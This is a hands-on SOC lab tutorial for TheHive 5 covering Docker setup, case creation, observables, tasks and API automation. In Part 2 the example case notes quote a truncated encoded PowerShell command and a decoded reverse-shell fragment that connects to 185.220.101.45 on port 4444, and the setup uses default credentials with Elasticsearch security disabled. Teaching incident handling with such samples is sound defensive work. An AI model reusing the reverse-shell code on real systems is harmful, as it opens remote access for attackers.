# Demo 02 — Ticketing Systems: TheHive for Incident Case Management

## Overview

This demo walks through deploying **TheHive 5**, the leading open-source Security Incident Response Platform (SIRP).
We create cases, add observables (IOCs), assign tasks, and integrate with MISP for threat intelligence enrichment.

**Duration:** 40 minutes

**Difficulty:** Beginner–Intermediate

**Tools:** Docker, TheHive 5, Cortex (optional enrichment)

---

## Setup

### Docker Compose

```yaml
# docker-compose.yml
version: "3.8"

services:
  thehive:
    image: strangebee/thehive:5.2
    container_name: thehive
    ports:
      - "9000:9000"
    environment:
      - JVM_OPTS=-Xms512m -Xmx1024m
    volumes:
      - thehive-data:/opt/thp/thehive/data
      - thehive-index:/opt/thp/thehive/index
      - thehive-attachments:/opt/thp/thehive/attachments
    networks:
      - thehive-net
    depends_on:
      - cassandra
      - elasticsearch

  cassandra:
    image: cassandra:4.1
    container_name: cassandra
    environment:
      - CASSANDRA_CLUSTER_NAME=thehive
      - MAX_HEAP_SIZE=512M
      - HEAP_NEWSIZE=128M
    volumes:
      - cassandra-data:/var/lib/cassandra
    networks:
      - thehive-net
    healthcheck:
      test: ["CMD-SHELL", "nodetool status | grep -q UN"]
      interval: 30s
      timeout: 10s
      retries: 10

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.17.12
    container_name: elasticsearch
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - bootstrap.memory_lock=true
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ulimits:
      memlock:
        soft: -1
        hard: -1
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data
    networks:
      - thehive-net

networks:
  thehive-net:
    driver: bridge

volumes:
  thehive-data:
  thehive-index:
  thehive-attachments:
  cassandra-data:
  elasticsearch-data:
```

### Start and initialize

```console
docker compose up -d
# Wait 3-5 minutes for all services to initialize

# Check logs
docker compose logs -f thehive

# Access TheHive at: http://localhost:9000
# Default credentials: admin@thehive.local / secret
```

**Important:** On first login you'll be prompted to create an organization and user.

---

## Part 1: Organization and User Setup (5 minutes)

### Create an organization

1. Log in as `admin@thehive.local / secret`
1. Navigate to **Admin** → **Organizations**
1. Click **Add Organization**
   * Name: `SecureBank-SOC`
   * Description: `SOC for SecureBank Corp`
1. Click **Confirm**

### Create SOC users

1. Navigate to **Admin** → **Users**
1. Create Tier 1 analyst:
   * Login: `tier1@securebank.com`
   * Name: `Alice Tier1`
   * Organization: SecureBank-SOC
   * Profile: `analyst`
1. Create Tier 2 analyst:
   * Login: `tier2@securebank.com`
   * Name: `Bob Tier2`
   * Organization: SecureBank-SOC
   * Profile: `analyst`

---

## Part 2: Create a Case from an Alert (15 minutes)

### Create a case manually

1. Navigate to **Cases** → **New Case**
1. Fill in the case details:
   * **Title:** `Suspicious PowerShell execution — WORKSTATION-042`
   * **Severity:** High
   * **TLP:** Amber
   * **Tags:** `powershell`, `lolbin`, `endpoint`
   * **Description:**

     ```text
     EDR alert triggered on WORKSTATION-042 at 09:14 UTC.
     PowerShell executed with encoded command string from Office process.
     Parent process: WINWORD.EXE
     Child process: powershell.exe -enc JABjAGwAaQBlAG4AdA...

     User: john.smith@securebank.com (Finance Dept)
     Asset criticality: High (Finance workstation)
```

### Add observables (IOCs)

1. Navigate to the case, click **Observables** tab
1. Add the following observables:
   * Type: `hostname`, Value: `WORKSTATION-042`, Tags: `endpoint`
   * Type: `username`, Value: `john.smith@securebank.com`
   * Type: `hash`, Value: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`

     (SHA256 of PowerShell download), Tags: `malware-sample`

   * Type: `ip`, Value: `185.220.101.45` (C2 IP), Tags: `c2`, `suspicious`

### Add tasks

1. Navigate to **Tasks** tab
1. Add tasks:
   * **Task 1:** `Collect forensic artifacts from WORKSTATION-042` — Assigned to: Bob Tier2
   * **Task 2:** `Check lateral movement from WORKSTATION-042` — Assigned to: Alice Tier1
   * **Task 3:** `Reset john.smith credentials if confirmed malicious` — Assigned to: Bob Tier2
   * **Task 4:** `Submit hash to VirusTotal and MISP` — Assigned to: Alice Tier1

### Start a task and log work

1. Click **Task 1**
1. Click **Start**
1. Add a work log entry:

   ```text
   Collected: prefetch, event logs (4688, 4104), MFT entries
   PowerShell command decoded:
     $client = New-Object Net.Sockets.TCPClient('185.220.101.45', 4444)
   Confirmed: reverse shell to known Tor exit node
   Recommendation: Isolate host immediately
```

1. Click **Close Task** and mark as complete

---

## Part 3: TheHive API (10 minutes)

TheHive has a powerful REST API for SOAR integration.

### Get your API key

1. Click your username → **API Key**
1. Copy the key

### Query cases via API

```bash
# List all cases
curl -s -H "Authorization: Bearer YOUR_API_KEY" \
  http://localhost:9000/api/v1/query \
  -H "Content-Type: application/json" \
  -d '{"query": [{"_name": "listCase"}]}' | python3 -m json.tool

# Create a case via API
curl -s -X POST \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  http://localhost:9000/api/v1/case \
  -d '{
    "title": "Brute force attack on VPN - API created",
    "severity": 2,
    "tlp": 2,
    "flag": false,
    "tags": ["brute-force", "vpn"],
    "description": "Multiple failed VPN login attempts from 203.0.113.42"
  }'
```

### Python integration example

```python
import requests
import json

THEHIVE_URL = "http://localhost:9000"
API_KEY = "YOUR_API_KEY"

headers = {
    "Authorization": f"Bearer {API_KEY}",
    "Content-Type": "application/json"
}

def create_case(title, severity, description, tags):
    """Create a TheHive case."""
    case_data = {
        "title": title,
        "severity": severity,  # 1=Low, 2=Medium, 3=High, 4=Critical
        "tlp": 2,  # 2=Amber
        "flag": False,
        "tags": tags,
        "description": description
    }
    r = requests.post(
        f"{THEHIVE_URL}/api/v1/case",
        headers=headers,
        json=case_data
    )
    r.raise_for_status()
    return r.json()

def add_observable(case_id, obs_type, obs_value, tags=None):
    """Add an observable to a case."""
    obs_data = {
        "dataType": obs_type,
        "data": obs_value,
        "message": f"Added via automation",
        "tlp": 2,
        "tags": tags or []
    }
    r = requests.post(
        f"{THEHIVE_URL}/api/v1/case/{case_id}/observable",
        headers=headers,
        json=obs_data
    )
    r.raise_for_status()
    return r.json()

# Example usage
case = create_case(
    title="Suspicious DNS queries — DB-SERVER-01",
    severity=3,
    description="Repeated DNS queries to known DGA domains detected from database server.",
    tags=["dns-tunneling", "dga", "server"]
)
print(f"Created case: {case['_id']}")

obs = add_observable(case["_id"], "domain", "xkcd12345.evil-dga.xyz", ["dga", "c2"])
print(f"Added observable: {obs['_id']}")
```

---

## Part 4: Metrics and Discussion (10 minutes)

### View case statistics

Navigate to **Dashboard** in TheHive to see:

* Open cases by severity
* Cases by status (New, In Progress, Resolved)
* Task completion rates

### Discussion: Case management best practices

1. **Every alert that needs investigation gets a case** — no investigations happen outside the system
1. **Observables are always added** — they feed into threat intel and future correlation
1. **Task logs are detailed** — future analysts can understand what was done
1. **Cases are closed with a clear resolution** — "Resolved: True positive. Host isolated, credentials reset. No lateral movement confirmed."
1. **False positives are marked with a reason** — feeds into rule tuning

---

## Cleanup

```console
docker compose down -v
```
